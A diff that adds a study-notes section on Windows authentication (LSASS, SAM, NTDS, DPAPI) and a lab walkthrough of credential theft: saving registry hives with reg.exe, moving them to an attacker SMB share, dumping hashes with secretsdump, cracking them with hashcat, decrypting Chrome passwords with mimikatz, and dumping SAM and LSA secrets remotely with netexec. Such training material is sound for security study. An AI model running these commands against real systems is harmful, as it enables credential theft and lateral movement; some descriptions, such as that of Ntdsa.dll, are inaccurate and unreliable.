@@ -60,6 +60,25 @@
       - [Password Spraying](#password-spraying)
       - [Credential Stuffing](#credential-stuffing)
       - [Default Credentials](#default-credentials)
+  - [Windows Systems](#windows-systems)
+    - [Authentication Process](#authentication-process)
+      - [LSASS](#lsass)
+      - [SAM Database](#sam-database)
+      - [Credential Manager](#credential-manager)
+      - [NTDS](#ntds)
+    - [Attacking SAM, SYSTEM, and SECURITY](#attacking-sam-system-and-security)
+      - [Registry Hives](#registry-hives)
+        - [Using reg.exe to copy Registry Hives](#using-regexe-to-copy-registry-hives)
+        - [Creating a Share with smbserver](#creating-a-share-with-smbserver)
+        - [Moving Hive Copies to Share](#moving-hive-copies-to-share)
+      - [Dumping Hashes with secretsdump](#dumping-hashes-with-secretsdump)
+      - [Cracking Hashes with Hashcat](#cracking-hashes-with-hashcat)
+        - [Running Hashcat against NT hashes](#running-hashcat-against-nt-hashes)
+      - [DCC2 Hashes](#dcc2-hashes)
+      - [DPAPI](#dpapi)
+      - [Remote Dumping \& LSA Secrets Considerations](#remote-dumping--lsa-secrets-considerations)
+        - [Dumping LSA Secrets Remotely](#dumping-lsa-secrets-remotely)
+        - [Dumping SAM Remotely](#dumping-sam-remotely)
 
 ---
 
@@ -1317,4 +1336,362 @@ In addition to publicly available lists and tools, default credentials can often
 Imagine you have identified certain apps in use on a customer's network. After researching the default credentials online, you can combine them into a new list, formatted as ```username:password```, and reuse the previously mentioned Hydra to attempt access.
 
 Beyond apps, default credentials are also commonly associated with routers. One such list is available [here](https://www.softwaretestinghelp.com/default-router-username-and-password-list/). While it is less likely that the router credentials remain unchanged, oversights do occur. Routers used in internal testing environments, for example, may be left with default settings and can be exploited to gain further access.
+
+## Windows Systems
+
+### Authentication Process
+
+The Windows client authentication process involves multiple modules for logon, credential retrieval, and verification. Among the various authentication mechanisms in Windows, Kerberos is one of the most widely used and complex. The Local Security Authority (_LSA_) is a protected subsystem that authenticates users, manages local logins, oversees all aspects of local security, and provides services for translating between user names and security identifiers (_SIDs_).
+
+The security subsystems maintains security policies and user accounts on a computer system. On a DC, these policies and accounts apply to the entire domain and are stored in AD. Additionally, the LSA subsystem provides services for access control, permission checks, and the generation of security audit messages.
+
+![password attacks 1](../../images/password_attacks_1.png)
+
+Local interactive logon is handled through the coordination of several components: the logon process (_WinLogon_), the logon user interface process (_LogonUI_), credential providers, the Local Security Authority Subsystem Service (_LSASS_), one or more authentication packages, and either the Security Accounts Manager (_SAM_) or AD. Authentication packages, in this context, are Dynamic-Link-Libraries (_DLLs_) responsible for performing authentication checks. For example, for non-domain-joined and interactive logins, the Msv1_0.dll authentication package is typically used.
+
+WinLogon is a trusted system process responsible for managing security-related user interactions, such as:
+
+- launching LogonUI to prompt for credentials at login
+- handling password changes
+- locking and unlocking the workstation
+
+To obtain a user's account name and password, WinLogon relies on credential providers installed on the system. These credential providers are CDM objects implemented as DLLs.
+
+WinLogon is the only process that intercepts login requests from the keyboard, which are sent via RPC messages from Win32k.sys. At logon, it immediately launches the LogonUI application to present the graphical user interface. Once the user's credentials are collected by the credential provider, WinLogon passes them to the Local Security Authority Subsystem Service (_LSASS_) to authenticate the user.
+
+#### LSASS
+
+... is compromised of multiple modules and governs all authentication processes. Located at ```%SystemRoot%\System32\Lsass.exe``` in the file system, it is responsible for enforcing the local security policy, authentication users, and forwarding security audit logs to the Event Log. In essence, LSASS servers are the gatekeeper in Windows-based OS.
+
+| Authentication Packages | Description |
+| ----------------------- | ----------- |
+| Lsasrv.dll | the LSA Server service both enforces security policies and acts as the security package manager for the LSA; the LSA contains the Negotiate function, which selects either the NTLM or Kerberos protocol after determining which protocol is to be successful |
+| Msv1_0.dll | authentication package for local machine logons that don't require custom authentication |
+| Samsrv.dll | the Security Accounts Manager (_SAM_) stores local security accounts, enforces locally stored policies, and supports APIs |
+| Kerberos.dll | security package loaded by the LSA for Kerberos-based authentication on a machine |
+| Netlogon.dll | network-based logon service |
+| Ntdsa.dll | the library is used to create new records and folders in the Windows registry |
+
+Each interactive logon session creates a separate instance of the WinLogon service. The Graphical Identification and Authentication (_GINA_) architecture is loaded into the process area used by WinLogon, receives and processes the credentials, and invokes the authentication interfaces via the LSALogonUser function.
+
+#### SAM Database
+
+The Security Account Manager (_SAM_) is a database file in Windows OS that stores user account credentials. It is used to authenticate both local and remote users and uses cryptographic protections to prevent unauthorized access. User passwords are stored in hashes in the registry, typically in the form of either LM or NTLM hashes. The SAM file is located at ```%SystemRoot%\system32\config\SAM``` and is mounted under ```HKLM\SAM```. Viewing or accessing this file requires SYSTEM level privileges.
+
+Windows system can be assigned to either a workgroup or domain during setup. If the system has been assigned to a workgroup, it handles the SAM database locally and stores all existing users locally in this database. However, if the system has been joined to a domain, the DC must validate the credentials from the AD database (_ntds.dit_), which is stored in ```%SystemRoot%\ntds.dit```.
+
+To improve protection against offline cracking of the SAM database, Microsoft introduced a feature in Windows NT 4.0 called SYSKEY (_syskey.exe_). When enabled, SYSKEY partially encrypts the SAM file on disk, ensuring that password hashes for all local accounts are encrypted with a system-generated key.
+
+#### Credential Manager
+
+![password attacks 2](../../images/password_attacks_2.png)
+
+Credential Manager is a built-in feature of all Windows OS that allows users to store and manage credentials used to access network resources, websites, and applications. These saved credentials are stored per user profile in the user's Credential Locker. The credentials are encrypted and stored in at ```C:\Users\[Username]\AppData\Local\Microsoft\[Vault/Credentials]\```.
+
+There are various methods to decrypt credentials saved using Credential Manager.
+
+#### NTDS
+
+It is very common to encounter network environments where Windows systems are joined to a Windows domain. This setup simplifies centralized management, allowing admins to efficiently oversee all systems within their organization. In such environments, logon requests are sent to DCs within the same AD forest. Each DC hosts a file called NTDS.dit, which is synchronized across all DCs, with the exception of Read-Only DCs.
+
+NTDS.dit is a database file that stores AD data, including but not limited to:
+
+- user accounts (_username & password hashes_)
+- group accounts
+- computer accounts
+- group policy objects
+
+### Attacking SAM, SYSTEM, and SECURITY
+
+With administrative access to a Windows system, you can attempt to quickly dump the files associated with the SAM database, transfer them to your attack host, and begin cracking the hashes offline. Performing this process offline allows you to continue your attacks without having to maintain an active session with the target.
+
+#### Registry Hives
+
+There are three registry hives you can copy if you have local administrative access to a target system, each serving a specific purpose when it comes to dunping and cracking password hashes.
+
+| Registry Hive | Description |
+| ------------- | ----------- |
+| HKLM\SAM | contains password hashes for local user accounts; these hashes can be extracted and cracked to reveal plaintext passwords |
+| HKLM\SYSTEM | stores the system boot key, which is used to encrypt the SAM database; this key is required to decrypt the hashes |
+| HKLM\SECURITY | contains sensitive information used by the LSA, including cached domain credentials, cleartext passwords, DPAPI keys, and more |
+
+##### Using reg.exe to copy Registry Hives
+
+You can back up these hives using the reg.exe utility.
+
+```
+C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save
+
+The operation completed successfully.
+
+C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save
+
+The operation completed successfully.
+
+C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save
+
+The operation completed successfully.
+```
+
+If you're only interested in dumping the hashes of local users, you need only HKLM\SAM and HKLM\SYSTEM. However, it's often useful to save HKLM\SECURITY as well, since it can contain cached domain user credentials on domain-joined systems, along with other valuable data. Once these hives are saved offline, you can use various methods to transfer them to your attack host.
+
+##### Creating a Share with smbserver
+
+To create the share, you simply run ```smbserver.py -smb2support```, specify a name for the share, and point to the local directory on your attack host where the hive will be stored. The ```-smb2support``` flag ensures compatibility with newer versions of SMB. If you do not include this flag, newer Windows systems may fail to connect to the share, as SMBv1 is disabled by default due to numerous severe vulns and publicly available exploits.
+
+```bash
+d41y@htb[/htb]$ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/
+
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
+```
+
+##### Moving Hive Copies to Share
+
+Once the share is running on your attack host, you can use the ```move``` command on the Windows target to transfer the hive copies to the share.
+
+```
+C:\> move sam.save \\10.10.15.16\CompData
+        1 file(s) moved.
+
+C:\> move security.save \\10.10.15.16\CompData
+        1 file(s) moved.
+
+C:\> move system.save \\10.10.15.16\CompData
+        1 file(s) moved.
+```
+
+You can confirm that your hive copies were successfully moved to the share by navigating to the shared directory on your attack host and using ```ls``` to list the files:
+
+```bash
+d41y@htb[/htb]$ ls
+
+sam.save  security.save  system.save
+```
+
+#### Dumping Hashes with secretsdump
+
+One particularly useful tool for dumping hashes offline is Impacket's secretsdump.
+
+Using secretsdump is straightforward. You simply run the script with Python and specify each of the hive files you retrieved from the target host:
+
+```bash
+d41y@htb[/htb]$ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
+
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+[*] Target system bootKey: 0x4d8c7cff8a543fbf245a363d2ffce518
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:3dd5a5ef0ed25b8d6add8b2805cce06b:::
+defaultuser0:1000:aad3b435b51404eeaad3b435b51404ee:683b72db605d064397cf503802b51857:::
+bob:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
+sam:1002:aad3b435b51404eeaad3b435b51404ee:6f8c3f4d3869a10f3b4f0522f537fd33:::
+rocky:1003:aad3b435b51404eeaad3b435b51404ee:184ecdda8cf1dd238d438c4aea4d560d:::
+ITlocal:1004:aad3b435b51404eeaad3b435b51404ee:f7eb9c06fafaa23c4bcf22ba6781c1e2:::
+[*] Dumping cached domain logon information (domain/username:hash)
+[*] Dumping LSA Secrets
+[*] DPAPI_SYSTEM 
+dpapi_machinekey:0xb1e1744d2dc4403f9fb0420d84c3299ba28f0643
+dpapi_userkey:0x7995f82c5de363cc012ca6094d381671506fd362
+[*] NL$KM 
+ 0000   D7 0A F4 B9 1E 3E 77 34  94 8F C4 7D AC 8F 60 69   .....>w4...}..`i
+ 0010   52 E1 2B 74 FF B2 08 5F  59 FE 32 19 D6 A7 2C F8   R.+t..._Y.2...,.
+ 0020   E2 A4 80 E0 0F 3D F8 48  44 98 87 E1 C9 CD 4B 28   .....=.HD.....K(
+ 0030   9B 7B 8B BF 3D 59 DB 90  D8 C7 AB 62 93 30 6A 42   .{..=Y.....b.0jB
+NL$KM:d70af4b91e3e7734948fc47dac8f606952e12b74ffb2085f59fe3219d6a72cf8e2a480e00f3df848449887e1c9cd4b289b7b8bbf3d59db90d8c7ab6293306a42
+[*] Cleaning up... 
+``` 
+
+Here you see that secretsdump successfully dumped the local SAM hashes, along with data from hklm\security, including cached domain logon information and LSA secrets such as the machine and user keys for DPAPI.
+
+Notice that the first step secretsdump performs is retrieving the system bootkey before proceeding to dump the local SAM hashes. This is necessary because the bootkey is used to encrypt and decrypt the SAM database. Without it, the hashes cannot be decrypted - which is why having copies of the relevant registry hives is crucial.
+
+Notice the following line:
+
+```
+Dumping local SAM hashes (uid:rid:lmhash:nthash)
+```
+
+This tells you how to interpret the output and which hashes you can attempt to crack. Most modern Windows OS store passwords as NT hashes. Older systems may store passwords as LM hashes, which are weaker and easier to crack. Therefore, LM hashes are useful if the target is running an older version of Windows.
+
+With this in mind, you can copy the NT hashes associated with each user account into a text file and begin cracking passwords. It is helpful to note which hash corresponds to which user to keep track of the results.
+
+#### Cracking Hashes with Hashcat
+
+Once you have the hashes, you can begin cracking them using Hashcat. Hashcat supports a wide range of hashing algorithms.
+
+You can populate a text file with the NT hashes you were able to dump:
+
+```bash
+d41y@htb[/htb]$ sudo vim hashestocrack.txt
+
+64f12cddaa88057e06a81b54e73b949b
+31d6cfe0d16ae931b73c59d7e0c089c0
+6f8c3f4d3869a10f3b4f0522f537fd33
+184ecdda8cf1dd238d438c4aea4d560d
+f7eb9c06fafaa23c4bcf22ba6781c1e2
+```
+
+##### Running Hashcat against NT hashes
+
+Hashcat supports many different modes, and selecting the right one depends largely on the type of attack and the specific hash type you want to crack.
+
+```bash
+d41y@htb[/htb]$ sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
+
+hashcat (v6.1.1) starting...
+
+<SNIP>
+
+Dictionary cache hit:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344385
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+
+f7eb9c06fafaa23c4bcf22ba6781c1e2:dragon          
+6f8c3f4d3869a10f3b4f0522f537fd33:iloveme         
+184ecdda8cf1dd238d438c4aea4d560d:adrian          
+31d6cfe0d16ae931b73c59d7e0c089c0:                
+                                                 
+Session..........: hashcat
+Status...........: Cracked
+Hash.Name........: NTLM
+Hash.Target......: dumpedhashes.txt
+Time.Started.....: Tue Dec 14 14:16:56 2021 (0 secs)
+Time.Estimated...: Tue Dec 14 14:16:56 2021 (0 secs)
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:    14284 H/s (0.63ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
+Recovered........: 5/5 (100.00%) Digests
+Progress.........: 8192/14344385 (0.06%)
+Rejected.........: 0/8192 (0.00%)
+Restore.Point....: 4096/14344385 (0.03%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidates.#1....: newzealand -> whitetiger
+
+Started: Tue Dec 14 14:16:50 2021
+Stopped: Tue Dec 14 14:16:58 2021
+```
+
+You can see from the output that Hashcat was successful in cracking three of the hashes. Having these passwords can be useful in many ways. For example, you could attempt to use the cracked credentials to access other systems on the network. It is very common for users to reuse passwords across different work and personal accounts. Understanding and applying this technique can be valuable during assessments. You will benefit from it anytime you encounter a vulnerable Windows system and gain administrative rights to dump the SAM database.
+
+Keep in mind that this is a well-known technique, and administrators may have implemented safeguards to detect or prevent it. Several detection and mitigation strategies are documented within the MITRE ATT&CK framework.
+
+#### DCC2 Hashes
+
+hklm\security contains cached domain logon information, specifically in the form of DCC2 hashes. These are local, hashed copies of network credential hashes. An example is:
+
+```
+inlanefreight.local/Administrator:$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25
+```
+
+This type of hash is much more difficult to crack than an NT hash, as it uses PBKDF2. Additionally, it cannot be used for lateral movement with techniques like Pass-the-Hash. The Hashcat mode for cracking DCC2 hashes is 2100.
+
+```bash
+d41y@htb[/htb]$ hashcat -m 2100 '$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25' /usr/share/wordlists/rockyou.txt
+
+<SNIP>
+
+$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25:ihatepasswords
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 2100 (Domain Cached Credentials 2 (DCC2), MS Cache 2)
+Hash.Target......: $DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25
+Time.Started.....: Tue Apr 22 09:12:53 2025 (27 secs)
+Time.Estimated...: Tue Apr 22 09:13:20 2025 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:     5536 H/s (8.70ms) @ Accel:256 Loops:1024 Thr:1 Vec:8
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 149504/14344385 (1.04%)
+Rejected.........: 0/149504 (0.00%)
+Restore.Point....: 148992/14344385 (1.04%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:9216-10239
+Candidate.Engine.: Device Generator
+Candidates.#1....: ilovelloyd -> gerber1
+Hardware.Mon.#1..: Util: 95%
+
+Started: Tue Apr 22 09:12:33 2025
+Stopped: Tue Apr 22 09:13:22 2025
+```
+
+Note the cracking speed of 5536 H/s. On the same machine, NTLM hashes can be cracked at 4605.4 kH/s. This means that cracking DCC2 hashes is approximately 800 times slower. The exact numbers will depend heavily on the hardware available, of course, but the takeaway is that strong passwords are often uncrackable within typical pentests.
+
+#### DPAPI
+
+In addition to the DCC2 hashes, you previously saw that the machine and user keys for DPAPI were also dumped from hklm\security. The Data Protection Application Programming Interface, or DPAPI, is a set of APIs in Windows OS used to encrypt and decrypt data blobs on a per-user basis. These blobs are utilized by various Windows OS features and third-party applications. Below are just a few examples of applications that use DPAPI and how they use it:
+
+| Application | Use of DPAPI |
+| ----------- | ------------ |
+| Internet Explorer | password form auto-completion data |
+| Google Chrome | password from auto-completion data |
+| Outlook | passwords for email accounts |
+| Remote Desktop Connection | saved credentials for connections to remote machines |
+| Credential Manager | saved credentials for accessing shared resources, joining wireless networks, VPNs and more |
+
+DPAPI encrypted credentials can be decrypted manually with tools like Impacket's dpapi, mimikatz, or remotely with DonPAPI.
+
+```
+C:\Users\Public> mimikatz.exe
+mimikatz # dpapi::chrome /in:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect
+> Encrypted Key found in local state file
+> Encrypted Key seems to be protected by DPAPI
+ * using CryptUnprotectData API
+> AES Key is: efefdb353f36e6a9b7a7552cc421393daf867ac28d544e4f6f157e0a698e343c
+
+URL     : http://10.10.14.94/ ( http://10.10.14.94/login.html )
+Username: bob
+ * using BCrypt with AES-256-GCM
+Password: April2025!
+```
+
+#### Remote Dumping & LSA Secrets Considerations
+
+With access to credentials that have local administrator privileges, it is also possible to target LSA secrets over the network. This may allow you to extract credentials from running services, scheduled tasks, or applications that store passwords using LSA secrets.
+
+##### Dumping LSA Secrets Remotely
+
+```bash
+d41y@htb[/htb]$ netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
+
+SMB         10.129.42.198   445    WS01     [*] Windows 10.0 Build 18362 x64 (name:FRONTDESK01) (domain:FRONTDESK01) (signing:False) (SMBv1:False)
+SMB         10.129.42.198   445    WS01     [+] WS01\bob:HTB_@cademy_stdnt!(Pwn3d!)
+SMB         10.129.42.198   445    WS01     [+] Dumping LSA secrets
+SMB         10.129.42.198   445    WS01     WS01\worker:Hello123
+SMB         10.129.42.198   445    WS01      dpapi_machinekey:0xc03a4a9b2c045e545543f3dcb9c181bb17d6bdce
+dpapi_userkey:0x50b9fa0fd79452150111357308748f7ca101944a
+SMB         10.129.42.198   445    WS01     NL$KM:e4fe184b25468118bf23f5a32ae836976ba492b3a432deb3911746b8ec63c451a70c1826e9145aa2f3421b98ed0cbd9a0c1a1befacb376c590fa7b56ca1b488b
+SMB         10.129.42.198   445    WS01     [+] Dumped 3 LSA secrets to /home/bob/.cme/logs/FRONTDESK01_10.129.42.198_2022-02-07_155623.secrets and /home/bob/.cme/logs/FRONTDESK01_10.129.42.198_2022-02-07_155623.cached
+```
+
+##### Dumping SAM Remotely
+
+```bash
+d41y@htb[/htb]$ netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
+
+SMB         10.129.42.198   445    WS01      [*] Windows 10.0 Build 18362 x64 (name:FRONTDESK01) (domain:WS01) (signing:False) (SMBv1:False)
+SMB         10.129.42.198   445    WS01      [+] FRONTDESK01\bob:HTB_@cademy_stdnt! (Pwn3d!)
+SMB         10.129.42.198   445    WS01      [+] Dumping SAM hashes
+SMB         10.129.42.198   445    WS01      Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         10.129.42.198   445    WS01     Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         10.129.42.198   445    WS01     DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         10.129.42.198   445    WS01     WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:72639bbb94990305b5a015220f8de34e:::
+SMB         10.129.42.198   445    WS01     bob:1001:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
+SMB         10.129.42.198   445    WS01     sam:1002:aad3b435b51404eeaad3b435b51404ee:a3ecf31e65208382e23b3420a34208fc:::
+SMB         10.129.42.198   445    WS01     rocky:1003:aad3b435b51404eeaad3b435b51404ee:c02478537b9727d391bc80011c2e2321:::
+SMB         10.129.42.198   445    WS01     worker:1004:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
+SMB         10.129.42.198   445    WS01     [+] Added 8 SAM hashes to the database
+```
 
